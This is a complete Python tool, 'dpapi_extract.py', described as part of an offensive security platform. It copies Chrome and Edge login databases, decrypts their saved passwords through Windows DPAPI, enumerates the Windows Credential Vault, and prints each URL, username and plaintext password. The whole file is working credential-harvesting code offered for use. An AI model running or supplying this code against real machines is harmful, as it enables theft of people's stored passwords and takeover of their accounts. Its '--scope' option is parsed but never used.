#!/usr/bin/env python3
"""
dpapi_extract.py - Decrypt DPAPI-protected secrets on Windows.

Extracts saved credentials from Chrome, Edge, and Windows Credential Vault
by calling CryptUnprotectData (crypt32.dll) and CredEnumerateW (advapi32.dll).
Copies locked SQLite databases before querying to avoid browser file locks.

Requires: Administrator privileges on Windows.

Part of CyberStrike offensive security platform.
"""

import argparse
import ctypes
import ctypes.wintypes
import json
import os
import signal
import shutil
import sqlite3
import sys
import tempfile
import time
from datetime import datetime


# --- DPAPI structures ---

class DATA_BLOB(ctypes.Structure):
    _fields_ = [
        ("cbData", ctypes.wintypes.DWORD),
        ("pbData", ctypes.POINTER(ctypes.c_byte)),
    ]


class CREDENTIAL(ctypes.Structure):
    _fields_ = [
        ("Flags", ctypes.wintypes.DWORD),
        ("Type", ctypes.wintypes.DWORD),
        ("TargetName", ctypes.wintypes.LPWSTR),
        ("Comment", ctypes.wintypes.LPWSTR),
        ("LastWritten", ctypes.wintypes.FILETIME),
        ("CredentialBlobSize", ctypes.wintypes.DWORD),
        ("CredentialBlob", ctypes.POINTER(ctypes.c_byte)),
        ("Persist", ctypes.wintypes.DWORD),
        ("AttributeCount", ctypes.wintypes.DWORD),
        ("Attributes", ctypes.c_void_p),
        ("TargetAlias", ctypes.wintypes.LPWSTR),
        ("UserName", ctypes.wintypes.LPWSTR),
    ]


class DpapiExtractor:
    """Extracts DPAPI-protected secrets from browsers and Windows Credential Vault."""

    BROWSER_PATHS = {
        "chrome": os.path.join(
            os.environ.get("LOCALAPPDATA", ""),
            "Google", "Chrome", "User Data", "Default", "Login Data",
        ),
        "edge": os.path.join(
            os.environ.get("LOCALAPPDATA", ""),
            "Microsoft", "Edge", "User Data", "Default", "Login Data",
        ),
    }

    def __init__(self, scope="user", browser="all", json_output=False):
        self.scope = scope
        self.browser = browser
        self.json_output = json_output
        self.running = True
        self.results = []
        self.start_time = None
        self.crypt32 = None
        self.advapi32 = None
        self.kernel32 = None
        self.temp_files = []

    def check_admin(self):
        """Verify the script is running with Administrator privileges."""
        try:
            is_admin = ctypes.windll.shell32.IsUserAnAdmin()
        except AttributeError:
            is_admin = False
        if not is_admin:
            print(
                "ERROR: dpapi_extract.py requires Administrator privileges.",
                file=sys.stderr,
            )
            sys.exit(1)

    def print_banner(self):
        browsers = self.browser if self.browser != "all" else "chrome, edge"
        print("=" * 70)
        print("  dpapi_extract.py - DPAPI Secret Extractor (Windows)")
        print("=" * 70)
        print(f"  PID:         {os.getpid()}")
        print(f"  Scope:       {self.scope}")
        print(f"  Browsers:    {browsers}")
        print(f"  JSON output: {self.json_output}")
        print("=" * 70)
        print()

    def signal_handler(self, signum, frame):
        self.running = False

    def _load_libraries(self):
        """Load Windows DLLs for DPAPI and credential operations."""
        self.crypt32 = ctypes.windll.crypt32
        self.advapi32 = ctypes.windll.advapi32
        self.kernel32 = ctypes.windll.kernel32

    def _decrypt_dpapi(self, encrypted_bytes):
        """Decrypt a DPAPI-protected blob using CryptUnprotectData."""
        blob_in = DATA_BLOB()
        blob_in.cbData = len(encrypted_bytes)
        blob_in.pbData = (ctypes.c_byte * len(encrypted_bytes))(*encrypted_bytes)

        blob_out = DATA_BLOB()
        flags = 0x01  # CRYPTPROTECT_UI_FORBIDDEN

        result = self.crypt32.CryptUnprotectData(
            ctypes.byref(blob_in),
            None,
            None,
            None,
            None,
            flags,
            ctypes.byref(blob_out),
        )

        if not result:
            return None

        decrypted = bytes(
            (ctypes.c_byte * blob_out.cbData).from_address(
                ctypes.addressof(blob_out.pbData.contents)
            )
        )
        self.kernel32.LocalFree(blob_out.pbData)
        return decrypted

    def _copy_locked_db(self, db_path):
        """Copy a locked SQLite database to a temporary file for reading."""
        if not os.path.exists(db_path):
            return None
        temp_fd, temp_path = tempfile.mkstemp(suffix=".db")
        os.close(temp_fd)
        try:
            shutil.copy2(db_path, temp_path)
            self.temp_files.append(temp_path)
            return temp_path
        except (OSError, PermissionError) as exc:
            self._log(f"Failed to copy database {db_path}: {exc}", level="warning")
            return None

    def _extract_browser_credentials(self, browser_name, db_path):
        """Extract and decrypt credentials from a Chromium-based browser."""
        if not os.path.exists(db_path):
            self._log(f"{browser_name} Login Data not found at {db_path}", level="info")
            return

        temp_db = self._copy_locked_db(db_path)
        if not temp_db:
            return

        self._log(f"Extracting credentials from {browser_name}...")

        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute(
                "SELECT origin_url, username_value, password_value FROM logins"
            )
            rows = cursor.fetchall()
            conn.close()
        except sqlite3.Error as exc:
            self._log(
                f"SQLite error reading {browser_name} database: {exc}",
                level="error",
            )
            return

        for origin_url, username, password_blob in rows:
            if not username and not password_blob:
                continue

            decrypted_password = ""
            if password_blob:
                raw = self._decrypt_dpapi(password_blob)
                if raw:
                    decrypted_password = raw.decode("utf-8", errors="replace")

            record = {
                "source": browser_name,
                "url": origin_url,
                "username": username,
                "password": decrypted_password,
            }
            self.results.append(record)
            self._emit_result(record)

    def _extract_vault_credentials(self):
        """Enumerate Windows Credential Vault entries via CredEnumerateW."""
        self._log("Enumerating Windows Credential Vault...")

        cred_count = ctypes.wintypes.DWORD(0)
        cred_array = ctypes.POINTER(ctypes.POINTER(CREDENTIAL))()

        # CredEnumerateW(Filter, Flags, Count, Credentials)
        # Filter=None enumerates all, Flags=0
        result = self.advapi32.CredEnumerateW(
            None,
            0,
            ctypes.byref(cred_count),
            ctypes.byref(cred_array),
        )

        if not result:
            error_code = ctypes.GetLastError()
            if error_code == 1168:  # ERROR_NOT_FOUND
                self._log("No credentials found in Credential Vault.", level="info")
            else:
                self._log(
                    f"CredEnumerateW failed with error {error_code}",
                    level="warning",
                )
            return

        for i in range(cred_count.value):
            cred = cred_array[i].contents
            target = cred.TargetName or ""
            username = cred.UserName or ""

            decrypted_password = ""
            if cred.CredentialBlobSize > 0 and cred.CredentialBlob:
                blob_bytes = bytes(
                    (ctypes.c_byte * cred.CredentialBlobSize).from_address(
                        ctypes.addressof(cred.CredentialBlob.contents)
                    )
                )
                try:
                    decrypted_password = blob_bytes.decode("utf-16-le", errors="replace")
                except Exception:
                    decrypted_password = blob_bytes.hex()

            record = {
                "source": "vault",
                "url": target,
                "username": username,
                "password": decrypted_password,
            }
            self.results.append(record)
            self._emit_result(record)

        # Free credential memory
        self.advapi32.CredFree(cred_array)

    def _log(self, message, level="info", **extra):
        if self.json_output:
            payload = {"level": level, "message": message, "timestamp": time.time()}
            payload.update(extra)
            print(json.dumps(payload), flush=True)
        else:
            print(f"[dpapi_extract] {message}", flush=True)

    def _emit_result(self, record):
        """Output a single credential result."""
        timestamp = datetime.now().isoformat()
        if self.json_output:
            output = {
                "level": "credential",
                "timestamp": timestamp,
                **record,
            }
            print(json.dumps(output), flush=True)
        else:
            print(
                f"[{timestamp}] SOURCE={record['source']:<8} "
                f"URL={record['url']:<50} "
                f"USER={record['username']:<30} "
                f"PASS={record['password']}",
                flush=True,
            )

    def run(self):
        """Execute the full extraction pipeline."""
        self.check_admin()
        self.print_banner()

        signal.signal(signal.SIGINT, self.signal_handler)
        signal.signal(signal.SIGTERM, self.signal_handler)

        self._load_libraries()
        self.start_time = time.monotonic()

        # Determine which browsers to extract from
        browsers_to_scan = []
        if self.browser == "all":
            browsers_to_scan = list(self.BROWSER_PATHS.items())
        else:
            path = self.BROWSER_PATHS.get(self.browser)
            if path:
                browsers_to_scan = [(self.browser, path)]

        if not self.json_output:
            print(
                f"{'TIMESTAMP':<28} {'SOURCE':<12} "
                f"{'URL':<54} {'USER':<34} {'PASS'}"
            )
            print("-" * 140)

        # Extract browser credentials
        for browser_name, db_path in browsers_to_scan:
            if not self.running:
                break
            self._extract_browser_credentials(browser_name, db_path)

        # Extract Credential Vault entries
        if self.running:
            self._extract_vault_credentials()

        self.cleanup()

    def cleanup(self):
        """Remove temporary files and print summary."""
        for temp_path in self.temp_files:
            try:
                os.unlink(temp_path)
            except OSError:
                pass

        print(f"\n--- dpapi_extract summary ---")
        print(f"Extracted {len(self.results)} credential(s)")
        if self.start_time:
            elapsed = time.monotonic() - self.start_time
            print(f"Duration: {elapsed:.1f}s")
        print("Cleanup complete. Exiting.")


def main():
    parser = argparse.ArgumentParser(
        description="Decrypt DPAPI-protected secrets from browsers and Windows Credential Vault.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=(
            "Examples:\n"
            "  python3 dpapi_extract.py\n"
            "  python3 dpapi_extract.py --scope user --browser chrome\n"
            "  python3 dpapi_extract.py --browser edge --json-output\n"
            "  python3 dpapi_extract.py --scope machine --json-output\n"
        ),
    )
    parser.add_argument(
        "--scope",
        choices=["user", "machine"],
        default="user",
        help="DPAPI scope: user (current user) or machine (machine-level). Default: user.",
    )
    parser.add_argument(
        "--browser",
        choices=["chrome", "edge", "all"],
        default="all",
        help="Browser to extract from. Default: all.",
    )
    parser.add_argument(
        "--json-output",
        action="store_true",
        default=False,
        help="Output results as JSON lines for structured consumption.",
    )
    args = parser.parse_args()

    extractor = DpapiExtractor(
        scope=args.scope,
        browser=args.browser,
        json_output=args.json_output,
    )
    extractor.run()


if __name__ == "__main__":
    main()
